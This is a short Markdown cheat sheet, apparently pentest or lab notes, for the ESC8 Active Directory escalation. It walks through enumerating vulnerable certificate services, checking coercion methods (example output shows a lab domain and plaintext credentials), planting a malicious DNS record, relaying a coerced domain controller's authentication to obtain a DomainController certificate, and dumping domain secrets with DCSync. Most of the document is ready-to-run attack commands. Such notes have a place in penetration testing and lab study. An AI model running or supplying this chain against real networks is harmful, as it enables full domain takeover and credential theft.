# Summary
ESC8 is a critical Active Directory escalation path that exploits misconfigured AD Certificate Services (ADCS) Web Enrollment, using NTLM relay and coercion to impersonate privileged accounts like Domain Admins. It’s a post-exploitation attack that leverages vulnerable certificate templates and CA settings to silently escalate privileges, without triggering security defenses, and doesn’t rely on malware or zero-day exploits.

# ESC8 + Kerberos Relay
## Prerequisites
- Enumerate ESC8 with Ceritpy
```bash
certipy-ad find -target [IP or hostname of DC] -u [user] -p [pass] -k -vulnerable -stdout
```
- Also enumerate whether we can run coercion attacks on the DC
```bash
nxc smb [Host or IP] -u [user] -p [pass] -k -M coerce_plus
```
Example Result
```bash
❯ nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, DFSCoerce
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, MSEven
```
## Exploitation
- Add a malicious DNS recrod pointing to the attack machine
```bash
bloodyad -u [user] -p [pass] -d [domain] -k --host [DNS Server] add dnsRecord [malicious A Record] [IP of attacker]
```
- Confirm with NSLookup or dig
```bash
dig 
```
- Setup the relay with certipyad or ntlmrelayx
```bash
certipy-ad relay -target 'web enrollment link' -template DomainController -subject CN=[hostname],CN=[OU],DC=[Domain],DC=[top domain]
```
- Coerce The DC into authenticating to our relay
```bash
nxc smb [hostname] -u [user] -p [pass] -k -M coerce_plus -o LISTENER=[malicious A Record] METHOD=[Method]
```
- Certipy Auth to get PFX
```bash
certipy-ad auth -pfx [file] -dc-ip [dc ip]
```
- DC Sync
```bash
KRB5CCNAME=[ccache] impacket-secretsdump -k -no-pass [DC]
```
